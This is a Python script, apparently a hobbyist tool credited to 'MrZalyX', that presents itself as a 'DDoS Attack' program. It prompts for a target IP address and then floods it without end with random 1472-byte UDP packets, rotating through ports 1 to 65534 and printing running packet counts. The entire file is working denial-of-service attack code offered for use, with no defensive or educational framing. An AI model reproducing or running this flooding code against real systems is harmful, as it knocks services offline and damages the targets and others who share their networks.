import os
import sys
import time
import socket
import random
import ipaddress
from datetime import datetime

def clear_terminal():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    clear_terminal()
    os.system("figlet DDoS Attack")
    print("Author : MrZalyX")
    print("GitHub : https://github.com/MrZalyX\n")

def get_target():
    try:
        while True:
            ip = input("Target IP Address : ")
            try:
                ipaddress.ip_address(ip)
                break
            except ValueError:
                print("Invalid IP address, please enter a correct IPv4 or IPv6 address.")
    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting.")
        exit(0)

    try:
        while True:
            print()
            choice = input("Show every packet sent? (Y/N): ").strip().lower()
            if choice == 'y':
                show_all = True
                break
            elif choice == 'n':
                show_all = False
                break
            else:
                print("Please enter 'Y' or 'N'.")
    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting.")
        exit(0)

    return ip, show_all

def loading_animation():
    try:
        for i in range(5, 0, -1):
            clear_terminal()
            print(f"Starting attack... {i}")
            time.sleep(1)
        clear_terminal()
    except KeyboardInterrupt:
        print("\n\n[!] Loading cancelled by user.")
        exit(0)

def start_attack(ip, show_all=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1472)
    port = 1
    sent = 0
    try:
        while True:
            sock.sendto(payload, (ip, port))
            sent += 1
            port += 1
            if port > 65534:
                port = 1

            if show_all or sent % 100000 == 0:
                now = datetime.now().strftime("%H:%M:%S")
                print(f"[{now}] Sent {sent} packets to {ip} through port {port}")
    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user.")
        exit(0)

if __name__ == "__main__":
    try:
        banner()
        ip, show_all = get_target()
        loading_animation()
        start_attack(ip, show_all)
    except KeyboardInterrupt:
        print("\n\n[!] Program interrupted by user. Exiting.")
        exit(0)
